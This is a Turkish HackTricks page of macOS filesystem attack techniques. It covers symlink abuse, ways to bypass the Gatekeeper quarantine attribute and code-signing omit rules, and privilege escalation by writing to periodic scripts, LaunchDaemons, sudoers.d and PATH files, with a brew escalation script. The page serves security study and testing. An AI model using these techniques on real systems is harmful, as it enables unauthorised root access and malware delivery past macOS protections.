# macOS FS İpuçları

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## POSIX izin kombinasyonları

Bir **dizin** içindeki izinler:

* **okuma** - dizin girdilerini **listeleyebilirsiniz**
* **yazma** - dizinde **dosyaları silebilir/yazabilirsiniz** ve **boş klasörleri silebilirsiniz**.
* Ancak **doluluk klasörlerini silemez/değiştiremezsiniz** yazma izniniz olmadıkça.
* Bir klasörün adını **değiştiremezsiniz** sahip olmadıkça.
* **çalıştırma** - dizini **gezebilmenize izin verilir** - bu hakkınız yoksa, içindeki dosyalara veya alt dizinlere erişemezsiniz.

### Tehlikeli Kombinasyonlar

**Root'a ait bir dosya/dizini nasıl üzerine yazabilirsiniz**, ancak:

* Yol üzerinde bir ebeveyn **dizin sahibi** kullanıcıdır
* Yol üzerinde bir ebeveyn **dizin sahibi** bir **kullanıcı grubudur** ve **yazma erişimi** vardır
* Bir kullanıcı **grubu**, **dosyaya yazma** erişimine sahiptir

Önceki kombinasyonlardan herhangi biriyle, bir saldırgan ayrıcalıklı keyfi yazma elde etmek için beklenen yola bir **sembolik/sabit bağ** enjekte edebilir.

### Dizin kökü R+X Özel durum

Eğer bir **dizinde yalnızca root'un R+X erişimine sahip olduğu dosyalar varsa**, bu dosyalara **başka kimse erişemez**. Bu nedenle, bir kullanıcının okuyabileceği ancak bu **kısıtlama** nedeniyle okuyamayacağı bir dosyanın bu dizinden **başka bir dizine taşınmasına** izin veren bir zafiyet, bu dosyaları okumak için kötüye kullanılabilir.

Örnek: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Sembolik Bağlantı / Sabit Bağlantı

Eğer ayrıcalıklı bir işlem, **daha düşük ayrıcalıklı bir kullanıcı tarafından kontrol edilebilecek bir dosyaya yazıyorsa**, veya daha önceden daha düşük ayrıcalıklı bir kullanıcı tarafından oluşturulmuşsa. Kullanıcı sadece bir Sembolik veya Sabit bağlantı aracılığıyla onu başka bir dosyaya **yönlendirebilir** ve ayrıcalıklı işlem o dosyaya yazacaktır.

Saldırganın ayrıcalıkları yükseltmek için keyfi yazmayı kötüye kullanabileceği diğer bölümlere bakın.

## .fileloc

**`.fileloc`** uzantılı dosyalar, diğer uygulamalara veya ikili dosyalara işaret edebilir, bu nedenle açıldıklarında uygulama/ikili dosya yürütülecektir.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Keyfi FD

Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya** zorlayabilirseniz, **`crontab`**'ı kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilir ve böylece `exploit.py`, `/etc/sudoers` içindeki dosyaya FD alacak ve bunu kötüye kullanabilecektir.

Örneğin: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Karantina xattrs hilelerinden kaçınma

### Kaldırma
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable bayrağı

Bir dosya/dizin bu değişmez özelliğe sahipse üzerine xattr eklemek mümkün olmayacaktır.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs bağlama

Bir **devfs** bağlaması **xattr**'ı desteklemez, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) bağlantısına bakın.
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, dosyayı ACE'leriyle birlikte kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebileceği gibi, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin temsili, sıkıştırılmış dosyada ACL olarak ayarlanacaktır. Dolayısıyla, bir uygulamayı diğer xattr'lerin yazılmasını engelleyen bir ACL ile AppleDouble dosya formatına sahip bir zip dosyasına sıkıştırırsanız... karantina xattr'ı uygulamaya ayarlanmaz:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.

Bunu çoğaltmak için önce doğru acl dizesini almalıyız:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile kum havuzu xattr'yi yazmadan önce)

Gerçekten gerekli değil ama her ihtimale karşı orada bırakıyorum:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Kod İmzalarını Atlatma

Bundles, **`_CodeSignature/CodeResources`** dosyasını içerir ki bu dosya **bündle** içindeki her **dosyanın karmasını** içerir. CodeResources'un karması ayrıca **yürütülebilir dosyaya gömülüdür**, bu yüzden onunla oynayamayız.

Ancak, imzası kontrol edilmeyecek bazı dosyalar vardır, bunlar plist'te omit anahtarına sahiptir, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Aşağıdaki komutu kullanarak bir kaynağın imzasını CLI üzerinden hesaplamak mümkündür:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Dmg Dosyalarını Bağlama

Bir kullanıcı, hatta bazı mevcut klasörlerin üstüne bile özel içerik oluşturarak özel bir dmg dosyasını bağlayabilir. Özel içeriğe sahip özel bir dmg paketi nasıl oluşturabileceğinizi aşağıda bulabilirsiniz:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Genellikle macOS, diski `com.apple.DiskArbitrarion.diskarbitrariond` Mach hizmetiyle bağlar (`/usr/libexec/diskarbitrationd` tarafından sağlanır). Başlangıç Daemons plist dosyasına `-d` parametresini ekleyip yeniden başlatırsanız, logları `/var/log/diskarbitrationd.log` dosyasında saklar.\
Ancak, `hdik` ve `hdiutil` gibi araçları kullanarak `com.apple.driver.DiskImages` kextiyle doğrudan iletişim kurmak mümkündür.

## Keyfi Yazma

### Periyodik sh betikleri

Eğer betiğiniz bir **shell betiği** olarak yorumlanabilirse, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.

Bu betiğin sahte bir şekilde çalıştırılmasını sağlayabilirsiniz: **`sudo periodic daily`**

### Daemonlar

Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** adında bir plist dosyası oluşturun ve keyfi bir betiği çalıştıran bir plist ekleyin:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoers Dosyası

Eğer **keyfi yazma** yetkiniz varsa, kendinize **sudo** ayrıcalıkları veren bir dosya oluşturabilirsiniz. Bu dosyayı **`/etc/sudoers.d/`** klasörü içine oluşturabilirsiniz.

### PATH dosyaları

**`/etc/paths`** dosyası, PATH ortam değişkenini dolduran ana yerlerden biridir. Üzerine yazmak için root olmanız gerekir, ancak bir **yetkili işlem** tarafından **tam yol olmadan komut** çalıştırılıyorsa, bu dosyayı değiştirerek onu **ele geçirebilirsiniz**.

`PATH` ortam değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içine dosyalar da yazabilirsiniz.

## Diğer kullanıcılar olarak yazılabilir dosyalar oluşturma

Bu, benim tarafımdan yazılabilir olan ancak root'a ait bir dosya oluşturacaktır ([**buradan kod**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Bu ayrıca bir ayrıcalık yükseltme olarak da çalışabilir.
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Paylaşılan Bellek

**POSIX paylaşılan bellek**, POSIX uyumlu işletim sistemlerindeki işlemlerin ortak bir bellek alanına erişmesine olanak tanır, diğer işlemler arası iletişim yöntemlerine kıyasla daha hızlı iletişimi kolaylaştırır. Bu, `shm_open()` ile bir paylaşılan bellek nesnesi oluşturup veya açarak başlar, ardından `ftruncate()` ile boyutunu ayarlar ve `mmap()` kullanarak bu belleği işlemin adres alanına eşler. İşlemler daha sonra bu bellek alanından doğrudan okuma ve yazma yapabilir. Eşzamanlı erişimi yönetmek ve veri bozulmasını önlemek için genellikle mutexler veya semaforlar gibi senkronizasyon mekanizmaları kullanılır. Son olarak, işlemler paylaşılan belleği `munmap()` ve `close()` ile kapatır ve opsiyonel olarak bellek nesnesini `shm_unlink()` ile kaldırabilir. Bu sistem, birden fazla işlemin paylaşılan verilere hızlı bir şekilde erişmesi gereken ortamlarda etkili bir şekilde hızlı IPC için özellikle etkilidir.

<details>

<summary>Üretici Kod Örneği</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kodu Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Korunan Tanımlayıcılar

**macOS korunan tanımlayıcılar**, macOS'ta tanıtılan bir güvenlik özelliğidir ve kullanıcı uygulamalarındaki **dosya tanımlayıcı işlemlerinin** güvenliğini ve güvenilirliğini artırmayı amaçlar. Bu korunan tanımlayıcılar, dosya tanımlayıcılarıyla belirli kısıtlamaları veya "korumaları" ilişkilendirmenin bir yolunu sağlar ve bu kısıtlamalar çekirdek tarafından uygulanır.

Bu özellik, özellikle **izin verilmeyen dosya erişimi** veya **yarış koşulları** gibi belirli güvenlik açıklarının önlenmesi için oldukça faydalıdır. Bu açıklıklar, örneğin bir iş parçacığının **başka bir savunmasız iş parçacığına erişim sağladığında** veya bir dosya tanımlayıcısının bir savunmasız çocuk işlem tarafından **devralındığında** meydana gelir. Bu işlevselliğe ilişkin bazı işlevler şunlardır:

* `guarded_open_np`: Bir koruma ile FD açar
* `guarded_close_np`: Kapatır
* `change_fdguard_np`: Bir tanımlayıcı üzerinde koruma bayraklarını değiştirir (koruma korumasını kaldırmak dahil)

## Referanslar

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
